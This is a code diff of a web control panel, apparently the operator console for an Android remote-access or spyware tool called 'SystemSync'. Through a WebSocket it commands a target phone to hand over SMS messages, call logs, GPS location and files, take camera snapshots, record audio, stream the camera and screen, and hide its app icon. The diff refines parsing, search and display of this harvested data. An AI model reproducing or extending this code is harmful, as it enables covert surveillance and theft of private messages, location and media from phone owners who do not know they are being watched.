-            screenActive = true;
-            document.getElementById('screenBtn').innerText = 'Stop Screen';
-            showNotification('Screen share started');
-            pendingCommand = null;
-        } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
-            screenActive = false;
-            document.getElementById('screenBtn').innerText = 'Start Screen';
-            if (screenPC) { screenPC.close(); screenPC = null; }
-            showNotification('Screen share stopped');
-            pendingCommand = null;
-        } else if (msg.startsWith("APP_HIDDEN")) {
-            iconHidden = true;
-            document.getElementById('iconBtn').innerText = 'Show Icon';
-            showNotification('App icon hidden');
-            pendingCommand = null;
-        } else if (msg.startsWith("APP_SHOWN")) {
-            iconHidden = false;
-            document.getElementById('iconBtn').innerText = 'Hide Icon';
-            showNotification('App icon shown');
-            pendingCommand = null;
-        } else if (msg.startsWith("VIBRATE_DONE")) {
-            showNotification('Vibration done');
-            pendingCommand = null;
-        } else if (msg.startsWith("ERROR:")) {
-            panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
-            pendingCommand = null;
-        } else if (msg.startsWith("FILE_DATA:")) {
-            const base64 = msg.substring(10);
-            downloadBase64(base64, 'downloaded_file');
-            pendingCommand = null;
-        } else if (msg.startsWith('[') || msg.startsWith('{')) {
-            // Try to parse as JSON (raw response from device)
-            try {
-                const parsed = JSON.parse(msg);
-                handleJSON(parsed);
-            } catch (err) {
-                console.error('Failed to parse JSON in plain text:', err);
-            }
-        } else {
-            console.log('Unhandled plain text:', msg);
-        }
+        if (msg.startsWith('STATUS:'))           { setStatus(msg.substring(7)); }
+        else if (msg.startsWith('LOC_DATA:'))    { try { renderMap(JSON.parse(msg.substring(9)));   pendingCommand = null; } catch(e){} }
+        else if (msg.startsWith('FILE_LIST:'))   { try { currentData = JSON.parse(msg.substring(10)); dataType='file'; renderFiles(); pendingCommand = null; } catch(e){} }
+        else if (msg.startsWith('SMS_DATA:'))    { try { currentData = JSON.parse(msg.substring(9));  dataType='sms'; renderTable(); pendingCommand = null; } catch(e){} }
+        else if (msg.startsWith('CALL_DATA:'))   { try { currentData = JSON.parse(msg.substring(10)); dataType='call'; renderTable(); pendingCommand = null; } catch(e){} }
+        else if (msg.startsWith('CAMERA_IMAGE:')){ displayCapturedImage(msg.substring(13)); pendingCommand = null; }
+        else if (msg.startsWith('AUDIO_RECORDING:')){ showAudio(msg.substring(16)); pendingCommand = null; }
+        else if (msg.startsWith('APP_HIDDEN'))   { iconHidden=true;  document.getElementById('iconBtn').innerText='Show Icon'; showNotification('App hidden'); }
+        else if (msg.startsWith('APP_SHOWN'))    { iconHidden=false; document.getElementById('iconBtn').innerText='Hide Icon'; showNotification('App shown'); }
+        else if (msg.startsWith('VIBRATE_DONE')) { showNotification('Vibration done'); }
+        else if (msg.startsWith('ERROR:'))       { panel.innerHTML='<div style="color:#d32f2f;">❌ '+msg.substring(6)+'</div>'; pendingCommand=null; }
+        else if (msg.startsWith('FILE_DATA:'))   { downloadBase64(msg.substring(10),'downloaded_file'); pendingCommand=null; }
+        else { console.log('Unhandled:', msg); }
     }
 
+    // ─── WebSocket ────────────────────────────────────────────────────────────
+    function connectWebSocket() {
+        if (ws) { try { ws.close(); } catch(e){} ws = null; }
+        setStatus('CONNECTING');
+        ws = new WebSocket(WS_URL);
+        ws.onopen = () => {
+            ws.send('I_AM_WEB'); setStatus('ONLINE');
+            panel.innerHTML = '✅ Connected. Ready.';
+        };
+        ws.onmessage = (e) => {
+            const msg = e.data;
+            console.log('RAW:', msg.length > 300 ? msg.substr(0,300)+'…' : msg);
+            try { handleJSON(JSON.parse(msg)); } catch(_) { handlePlainText(msg); }
+        };
+        ws.onclose = () => { setStatus('OFFLINE'); panel.innerHTML = '🔌 Disconnected. Click ⟲ Reconnect.'; ws = null; };
+        ws.onerror = () => setStatus('ERROR');
+    }
+
+    // ─── UI helpers ───────────────────────────────────────────────────────────
     function setStatus(s) {
         statusEl.innerText = s;
         if (s === 'ONLINE') {
             statusEl.classList.remove('offline');
-            statusEl.style.background = '#e8f5e9';
-            statusEl.style.color = '#2e7d32';
+            statusEl.style.background = '#e8f5e9'; statusEl.style.color = '#2e7d32';
         } else {
             statusEl.classList.add('offline');
-            statusEl.style.background = '#ffebee';
-            statusEl.style.color = '#c62828';
+            statusEl.style.background = '#ffebee'; statusEl.style.color = '#c62828';
         }
     }
 
-    // ---------- CAMERA UI ----------
+    function showNotification(text) {
+        const orig = statusEl.innerText;
+        statusEl.innerText = text;
+        setTimeout(() => { statusEl.innerText = orig; }, 2500);
+    }
+
     function toggleCameraPanel(panelId) {
         const clickPanel = document.getElementById('clickCameraPanel');
-        const livePanel = document.getElementById('liveCameraPanel');
-        if (panelId === 'click') {
-            clickPanel.classList.toggle('show');
-            livePanel.classList.remove('show');
-        } else {
-            livePanel.classList.toggle('show');
-            clickPanel.classList.remove('show');
-        }
+        const livePanel  = document.getElementById('liveCameraPanel');
+        if (panelId === 'click') { clickPanel.classList.toggle('show'); livePanel.classList.remove('show'); }
+        else                     { livePanel.classList.toggle('show'); clickPanel.classList.remove('show'); }
     }
 
     function capturePicture() {
-        const camera = document.querySelector('input[name="clickCameraSelect"]:checked').value;
+        const camera   = document.querySelector('input[name="clickCameraSelect"]:checked').value;
         const useFlash = document.getElementById('clickFlashCheckbox').checked;
         sendCommand('CAMERA_SNAPSHOT', { camera, flash: useFlash });
     }
 
     function displayCapturedImage(base64) {
-        panel.innerHTML = `
-            <img src="data:image/jpeg;base64,${base64}">
+        if (!base64) { panel.innerHTML='<div style="color:#d32f2f;">Camera returned no image.</div>'; return; }
+        panel.innerHTML = `<img src="data:image/jpeg;base64,${base64}" style="max-width:100%;border-radius:8px;">
             <div style="margin-top:10px;">
-                <button onclick="downloadBase64('${base64}', 'snapshot_${Date.now()}.jpeg')">SAVE IMAGE</button>
-            </div>
-        `;
+                <button onclick="downloadBase64('${base64}','snapshot_${Date.now()}.jpeg')"
+                    style="width:auto;padding:8px 14px;background:#1976ff;color:white;border:none;border-radius:6px;cursor:pointer;">💾 Save</button>
+            </div>`;
     }
 
-    // ---------- LIVE STREAM ACTIONS (snapshot/record) ----------
-    function takeSnapshot() {
-        const video = document.getElementById('liveCamVideo');
-        if (!video || !video.videoWidth) {
-            alert('No live video or video not ready');
-            return;
-        }
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(blob => {
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `snapshot_${Date.now()}.png`;
-            a.click();
-            URL.revokeObjectURL(url);
-        }, 'image/png');
-    }
-
-   function toggleRecording() {
-    const video = document.getElementById('liveCamVideo');
-    if (!video || !video.srcObject) {
-        alert('No live stream');
-        return;
-    }
-    if (mediaRecorder && mediaRecorder.state === 'recording') {
-        mediaRecorder.stop();
-        document.getElementById('recordBtn').innerText = 'Record Video';
-    } else {
-        recordedChunks = [];
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        const stream = video.srcObject;
-
-        if (video.videoWidth === 0) {
-            video.onloadedmetadata = () => startCanvasRecording(video, canvas, ctx, stream);
-        } else {
-            startCanvasRecording(video, canvas, ctx, stream);
-        }
-    }
-}
-
-function startCanvasRecording(video, canvas, ctx, originalStream) {
-    // Swap dimensions for 90° rotation
-    canvas.width = video.videoHeight;
-    canvas.height = video.videoWidth;
-
-    function drawVideoFrame() {
-        ctx.save();
-        ctx.translate(canvas.width / 2, canvas.height / 2);
-        ctx.rotate(90 * Math.PI / 180); // clockwise 90°
-        ctx.drawImage(video, -video.videoWidth / 2, -video.videoHeight / 2,
-                     video.videoWidth, video.videoHeight);
-        ctx.restore();
-        requestAnimationFrame(drawVideoFrame);
-    }
-    drawVideoFrame();
-
-    const canvasStream = canvas.captureStream(30);
-    originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
-
-    mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
-    mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
-    mediaRecorder.onstop = () => {
-        const blob = new Blob(recordedChunks, { type: 'video/webm' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `recording_${Date.now()}.webm`;
-        a.click();
-        URL.revokeObjectURL(url);
-        canvasStream.getTracks().forEach(track => track.stop());
-    };
-    mediaRecorder.start();
-    document.getElementById('recordBtn').innerText = 'Stop Recording';
-}
-    // ---------- APP ICON TOGGLE ----------
-    function toggleAppIcon() {
-        if (iconHidden) sendPlainText('showApp');
-        else sendPlainText('hideApp');
-    }
-
-    // ---------- RENDERERS ----------
     function showAudio(base64) {
-        panel.innerHTML = `
-            <audio controls src="data:audio/3gp;base64,${base64}"></audio>
-            <button onclick="downloadBase64('${base64}', 'recording.3gp')">Download</button>
-        `;
+        panel.innerHTML = `<audio controls src="data:audio/mp4;base64,${base64}" style="width:100%;margin-top:15px;"></audio>
+            <button onclick="downloadBase64('${base64}','recording.m4a')"
+                style="width:auto;margin-top:8px;padding:8px 14px;background:#1976ff;color:white;border:none;border-radius:6px;cursor:pointer;">💾 Download</button>`;
     }
 
     function downloadBase64(b64, filename) {
         const a = document.createElement('a');
         a.href = 'data:application/octet-stream;base64,' + b64;
-        a.download = filename;
-        a.click();
+        a.download = filename; a.click();
     }
 
+    function toggleAppIcon() { if (iconHidden) sendPlainText('showApp'); else sendPlainText('hideApp'); }
+
+    // ─── Map ──────────────────────────────────────────────────────────────────
     function renderMap(loc) {
-        panel.innerHTML = '<div id="map" style="position:relative;"></div>';
+        if (!loc || loc.lat == null) { panel.innerHTML='<div style="color:#d32f2f;">No location data</div>'; return; }
+        panel.innerHTML = '<div id="map" style="height:420px;border-radius:10px;position:relative;"></div>';
         const mapDiv = document.getElementById('map');
 
         const infoDiv = document.createElement('div');
@@ -1100,279 +1010,208 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
             <div class="coord">📍 ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}</div>
             <div>🎯 Accuracy: ${loc.accuracy ? loc.accuracy.toFixed(1) : '?'} m</div>
             <div>📡 Provider: ${loc.provider || 'unknown'}</div>
-            <div class="addr">🌍 Loading address...</div>
-        `;
+            <div class="addr">🌍 Loading address…</div>`;
         mapDiv.appendChild(infoDiv);
 
-        if (mapInstance) mapInstance.remove();
-        mapInstance = L.map(mapDiv).setView([loc.lat, loc.lon], 18);
+        if (mapInstance) { mapInstance.remove(); mapInstance = null; }
+        mapInstance = L.map(mapDiv).setView([loc.lat, loc.lon], 17);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
-        L.circle([loc.lat, loc.lon], { radius: loc.accuracy || 10, color: '#1976ff' }).addTo(mapInstance);
+        L.marker([loc.lat, loc.lon]).addTo(mapInstance)
+            .bindPopup('Device Location').openPopup();
+        if (loc.accuracy) L.circle([loc.lat, loc.lon], { radius: loc.accuracy, color: '#1976ff', fillOpacity: 0.15 }).addTo(mapInstance);
 
-        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18&addressdetails=1`, {
-            headers: { 'User-Agent': 'SystemSync-Console/1.0' }
-        })
-        .then(response => response.json())
-        .then(data => {
-            const address = data.display_name || 'Address not found';
-            infoDiv.querySelector('.addr').innerHTML = `🌍 ${address}`;
-        })
-        .catch(err => {
-            console.error('Geocoding error:', err);
-            infoDiv.querySelector('.addr').innerHTML = '🌍 Address unavailable';
-        });
+        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18`,
+              { headers: { 'User-Agent': 'SystemSync/1.0' } })
+            .then(r => r.json())
+            .then(d => { infoDiv.querySelector('.addr').innerText = '🌍 ' + (d.display_name || 'Unknown'); })
+            .catch(() => { infoDiv.querySelector('.addr').innerText = '🌍 Address unavailable'; });
     }
 
+    // ─── SMS / Call Log Table ─────────────────────────────────────────────────
     function renderTable() {
-        if (!currentData || currentData.length === 0) {
-            panel.innerHTML = '<p>No data</p>';
+        if (!currentData || !currentData.length) {
+            panel.innerHTML = '<div style="padding:20px;text-align:center;color:#7b8a9b;">📭 No data received yet.<br>If this persists, check permissions on the device.</div>';
             return;
         }
 
-        let headers = [], rows = [];
+        let headers, rows;
         if (dataType === 'sms') {
-            headers = ['Type', 'Number', 'Message', 'Date'];
-            rows = currentData.map(item => [item.type, item.number, item.body, item.date]);
+            headers = ['Type','Number / Sender','Message','Date','Read'];
+            rows = currentData.map(i => [
+                i.type || '-',
+                i.address || i.number || '-',   // Android sends "address" field
+                i.body || '-',
+                i.date || '-',
+                i.read === true ? '✓' : (i.read === false ? '✗' : '-')
+            ]);
         } else if (dataType === 'call') {
-            headers = ['Type', 'Number', 'Name', 'Date', 'Duration'];
-            rows = currentData.map(item => [
-                item.type,
-                item.number,
-                item.name || '',
-                item.date,
-                item.duration + 's'
+            headers = ['Type','Number','Name','Date','Duration'];
+            rows = currentData.map(i => [
+                i.type || '-',
+                i.number || i.phoneNumber || '-',
+                i.name || i.cachedName || '',
+                i.date || '-',
+                (i.duration != null ? i.duration : '?') + 's'
             ]);
         } else {
-            panel.innerHTML = '<p>Unknown data type</p>';
-            return;
+            panel.innerHTML = '<p>Unknown data type</p>'; return;
         }
 
-        const pageSize = 20;
-        const totalPages = Math.ceil(rows.length / pageSize);
-        const start = currentPage * pageSize;
-        const pageRows = rows.slice(start, start + pageSize);
+        const pageSize = 20, totalPages = Math.ceil(rows.length / pageSize);
+        const pageRows = rows.slice(currentPage * pageSize, (currentPage + 1) * pageSize);
 
-        let html = '<table><thead><tr>';
-        headers.forEach(h => html += `<th>${h}</th>`);
-        html += '</tr></thead><tbody>';
-
+        // Search bar
+        let html = `<div style="margin-bottom:10px;">
+            <input id="tableSearch" type="text" placeholder="🔍 Search…" oninput="filterTable(this.value)"
+                style="width:100%;box-sizing:border-box;padding:8px 12px;border:1px solid #d0d9e2;border-radius:8px;font-size:14px;">
+        </div>
+        <table><thead><tr>${headers.map(h => '<th>' + h + '</th>').join('')}</tr></thead>
+        <tbody id="tableBody">`;
         pageRows.forEach(r => {
-            html += '<tr>';
-            r.forEach(cell => html += `<td>${cell}</td>`);
-            html += '</tr>';
+            html += '<tr>' + r.map(c => '<td>' + escHtml(c != null ? String(c) : '') + '</td>').join('') + '</tr>';
         });
         html += '</tbody></table>';
 
         if (totalPages > 1) {
             html += '<div class="pagination">';
-            for (let i = 0; i < totalPages; i++) {
-                html += `<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`;
-            }
+            for (let i = 0; i < totalPages; i++) html += `<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`;
             html += '</div>';
         }
-
         panel.innerHTML = html;
     }
 
-    function gotoPage(p) {
-        currentPage = p;
-        renderTable();
+    function filterTable(query) {
+        const q = query.toLowerCase();
+        const rows = document.querySelectorAll('#tableBody tr');
+        rows.forEach(row => {
+            row.style.display = row.innerText.toLowerCase().includes(q) ? '' : 'none';
+        });
     }
 
+    function escHtml(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+    function gotoPage(p) { currentPage = p; renderTable(); }
+
+    // ─── File Manager (tree) ──────────────────────────────────────────────────
     function renderFiles() {
-        let html = `
-            <div class="file-manager">
-                <div class="file-toolbar-sticky">
-                    <div class="file-toolbar">
-                        <button onclick="navigateUp()">⬆ Up</button>
-                        <span class="file-path">${currentPath}</span>
-                        <div class="download-selected">
-                            <button onclick="downloadSelected()">Download Selected (${selectedFiles.length})</button>
-                        </div>
-                    </div>
-                </div>
-        `;
+        if (!currentData) currentData = [];
+        selectedFiles = [];
+        const folders = currentData.filter(i => i.isDir).sort((a,b) => a.name.localeCompare(b.name));
+        const files   = currentData.filter(i => !i.isDir).sort((a,b) => a.name.localeCompare(b.name));
 
-        if (!currentData || currentData.length === 0) {
-            html += '<p style="padding:20px;">No files found.</p>';
+        let html = `<div class="file-manager">
+            <div class="file-toolbar-sticky">
+                <div class="file-toolbar">
+                    <button onclick="navigateUp()" style="width:auto;">⬆ Up</button>
+                    <span class="file-path">${escHtml(currentPath)}</span>
+                    <button onclick="downloadSelected()" id="dlBtn" style="width:auto;background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;cursor:pointer;">
+                        💾 Download (0)
+                    </button>
+                </div>
+            </div>`;
+
+        if (!currentData.length) {
+            html += '<div style="padding:30px;text-align:center;color:#7b8a9b;">📁 Empty folder or permission denied</div>';
         } else {
-            const folders = currentData.filter(item => item.isDir);
-            const files = currentData.filter(item => !item.isDir);
-            selectedFiles = [];
-
-            html += `
-                <div class="file-panes">
-                    <div class="folder-pane">
-                        <div class="pane-title">Folders</div>
-                        <div id="folderList">
-            `;
-
+            // Folders
+            html += '<div class="file-panes"><div class="folder-pane"><div class="pane-title">📁 Folders (' + folders.length + ')</div>';
+            if (folders.length === 0) html += '<div style="padding:12px;color:#7b8a9b;font-size:13px;">No subfolders</div>';
             folders.forEach(f => {
-                html += `
-                    <div class="folder-item" onclick="handleFolderClick('${f.path}')">
-                        <span class="folder-icon">📁</span>
-                        <span class="folder-name">${f.name}</span>
-                    </div>
-                `;
+                const safePath = f.path.replace(/\\/g,'\\\\').replace(/'/g,"\\'");
+                html += `<div class="folder-item" onclick="handleFolderClick('${safePath}')">
+                    <span class="folder-icon">📁</span>
+                    <span class="folder-name">${escHtml(f.name)}</span>
+                </div>`;
             });
 
-            html += `
-                        </div>
-                    </div>
-                    <div class="file-pane">
-                        <div class="pane-title">Files</div>
-                        <div id="fileList">
-            `;
-
+            // Files
+            html += '</div><div class="file-pane"><div class="pane-title">📄 Files (' + files.length + ')</div>';
+            if (files.length === 0) html += '<div style="padding:12px;color:#7b8a9b;font-size:13px;">No files</div>';
             files.forEach(f => {
-                const path = f.path;
-                const name = f.name;
-                const size = formatBytes(f.size);
-                html += `
-                    <div class="file-item">
-                        <input type="checkbox" class="file-checkbox" data-path="${path}" onchange="updateSelected(this)">
-                        <span class="file-icon">📄</span>
-                        <span class="file-name">${name}</span>
-                        <span class="file-size">${size}</span>
-                    </div>
-                `;
+                html += `<div class="file-item">
+                    <input type="checkbox" class="file-checkbox" data-path="${escHtml(f.path)}" onchange="updateSelected(this)">
+                    <span class="file-icon">${fileIcon(f.name)}</span>
+                    <span class="file-name">${escHtml(f.name)}</span>
+                    <span class="file-size">${formatBytes(f.size)}</span>
+                </div>`;
             });
-
-            html += `
-                        </div>
-                    </div>
-                </div>
-            `;
+            html += '</div></div>';
         }
-
         html += '</div>';
         panel.innerHTML = html;
     }
 
+    function fileIcon(name) {
+        const ext = name.split('.').pop().toLowerCase();
+        if (['jpg','jpeg','png','gif','webp','bmp'].includes(ext)) return '🖼';
+        if (['mp4','mkv','avi','mov','webm'].includes(ext)) return '🎬';
+        if (['mp3','aac','wav','m4a','ogg'].includes(ext)) return '🎵';
+        if (['pdf'].includes(ext)) return '📕';
+        if (['zip','rar','7z','tar','gz'].includes(ext)) return '🗜';
+        if (['apk'].includes(ext)) return '📦';
+        if (['txt','log','md'].includes(ext)) return '📝';
+        return '📄';
+    }
+
     function handleFolderClick(path) {
         currentPath = path;
-        sendCommand('LIST_FILES', { path: path });
+        sendCommand('LIST_FILES', { path });
     }
 
     function navigateUp() {
-        if (currentPath === 'root' || currentPath === '') return;
-        let parts = currentPath.split('/');
-        parts.pop();
-        let parent = parts.join('/');
-        if (parent === '') parent = 'root';
-        currentPath = parent;
-        sendCommand('LIST_FILES', { path: parent });
+        if (currentPath === 'root' || !currentPath) return;
+        const parts = currentPath.split('/'); parts.pop();
+        const parent = parts.join('/') || 'root';
+        currentPath = parent; sendCommand('LIST_FILES', { path: parent });
     }
 
     function updateSelected(checkbox) {
         const path = checkbox.dataset.path;
-        if (checkbox.checked) {
-            if (!selectedFiles.includes(path)) selectedFiles.push(path);
-        } else {
-            selectedFiles = selectedFiles.filter(p => p !== path);
-        }
-        const downloadBtn = document.querySelector('.download-selected button');
-        if (downloadBtn) {
-            downloadBtn.innerText = `Download Selected (${selectedFiles.length})`;
-        }
+        if (checkbox.checked) { if (!selectedFiles.includes(path)) selectedFiles.push(path); }
+        else selectedFiles = selectedFiles.filter(p => p !== path);
+        const btn = document.getElementById('dlBtn');
+        if (btn) btn.innerText = '💾 Download (' + selectedFiles.length + ')';
     }
 
     function downloadSelected() {
-        if (selectedFiles.length === 0) {
-            alert('No files selected');
-            return;
-        }
-        selectedFiles.forEach(path => {
-            sendPlainText('dl ' + path);
-        });
+        if (!selectedFiles.length) { showNotification('No files selected'); return; }
+        selectedFiles.forEach(path => sendPlainText('dl ' + path));
     }
 
     function formatBytes(b) {
-        if (b === 0) return '0 B';
-        const k = 1024, sizes = ['B','KB','MB','GB'];
+        if (!b) return '0 B';
+        const k = 1024, sz = ['B','KB','MB','GB'];
         const i = Math.floor(Math.log(b)/Math.log(k));
-        return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
+        return (b/Math.pow(k,i)).toFixed(1)+' '+sz[i];
     }
 
-    function showNotification(text) {
-        const orig = statusEl.innerText;
-        statusEl.innerText = text;
-        setTimeout(() => { statusEl.innerText = orig; }, 2000);
-    }
-
-    // ---------- WEBSOCKET MESSAGE HANDLER ----------
-    function handleIncomingMessage(msg) {
-        try {
-            const json = JSON.parse(msg);
-            if (json.type === 'SIGNALING') {
-                handleSignalingMessage(json.data);
-            } else {
-                // Assume it's a command response or other JSON
-                handleJSON(json);
-            }
-        } catch (e) {
-            // Not JSON – treat as plain text
-            handlePlainText(msg);
-        }
-    }
-
-    // ---------- WEBSOCKET CONNECTION ----------
-    function connectWebSocket() {
-        if (ws) {
-            ws.close();
-        }
-        setStatus('CONNECTING');
-        ws = new WebSocket(WS_URL);
-        ws.onopen = () => {
-            console.log('WebSocket connected');
-            ws.send('I_AM_WEB');
-            setStatus('ONLINE');
-            panel.innerHTML = '✅ Connected to server. Ready.';
-        };
-        ws.onmessage = (e) => {
-            console.log('RAW message:', e.data);
-            handleIncomingMessage(e.data);
-        };
-        ws.onclose = () => {
-            console.log('WebSocket closed');
-            setStatus('OFFLINE');
-            panel.innerHTML = '🔌 WebSocket disconnected. Click reconnect.';
-            ws = null;
-        };
-        ws.onerror = (err) => {
-            console.error('WebSocket error:', err);
-            setStatus('ERROR');
-        };
-    }
-
-    // ---------- ATTACH FUNCTIONS TO WINDOW ----------
-    window.toggleScreen = toggleScreen;
-    window.toggleCameraPanel = toggleCameraPanel;
-    window.capturePicture = capturePicture;
-    window.startLiveStream = startLiveStream;
-    window.stopLiveStream = stopLiveStream;
-    window.toggleLiveAudio = toggleLiveAudio;
-    window.stopLiveAudio = stopLiveAudio;
-    window.sendCommand = sendCommand;
-    window.sendPlainText = sendPlainText;
-    window.toggleAppIcon = toggleAppIcon;
-    window.takeSnapshot = takeSnapshot;
-    window.toggleRecording = toggleRecording;
-    window.downloadBase64 = downloadBase64;
-    window.gotoPage = gotoPage;
-    window.handleFolderClick = handleFolderClick;
-    window.navigateUp = navigateUp;
-    window.updateSelected = updateSelected;
-    window.downloadSelected = downloadSelected;
-    window.connectWebSocket = connectWebSocket;
-    window.snapScreen = snapScreen;
+    // ─── Expose globals ───────────────────────────────────────────────────────
+    window.toggleScreen       = toggleScreen;
+    window.toggleCameraPanel  = toggleCameraPanel;
+    window.capturePicture     = capturePicture;
+    window.startLiveStream    = startLiveStream;
+    window.stopLiveStream     = stopLiveStream;
+    window.toggleLiveAudio    = toggleLiveAudio;
+    window.stopLiveAudio      = stopLiveAudio;
+    window.sendCommand        = sendCommand;
+    window.sendPlainText      = sendPlainText;
+    window.toggleAppIcon      = toggleAppIcon;
+    window.takeSnapshot       = takeSnapshot;
+    window.toggleCamRecording = toggleCamRecording;
+    window.toggleScreenRecord = toggleScreenRecord;
+    window.changeScreenQuality= changeScreenQuality;
+    window.downloadBase64     = downloadBase64;
+    window.gotoPage           = gotoPage;
+    window.filterTable        = filterTable;
+    window.handleFolderClick  = handleFolderClick;
+    window.navigateUp         = navigateUp;
+    window.updateSelected     = updateSelected;
+    window.downloadSelected   = downloadSelected;
+    window.connectWebSocket   = connectWebSocket;
+    window.snapScreen         = snapScreen;
 
     document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);
-
-    // ---------- START ----------
     connectWebSocket();
 </script>
 </body>
 </html>
-
-
